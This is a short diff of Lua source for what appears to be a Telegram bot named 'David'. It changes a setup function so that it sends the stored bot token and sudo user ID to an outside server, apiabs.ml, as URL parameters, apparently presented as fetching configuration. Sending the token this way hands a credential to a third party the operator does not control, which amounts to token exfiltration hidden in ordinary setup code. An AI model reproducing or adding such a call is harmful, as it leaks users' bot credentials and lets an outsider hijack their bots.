@@ -66,7 +66,7 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://brok-aapi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
+local t = json:decode(https.request('https://apiabs.ml/config.php?Get=David&DevId='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
 print("::David::")
 local RunBot = io.open("David", 'w')
 RunBot:write([[
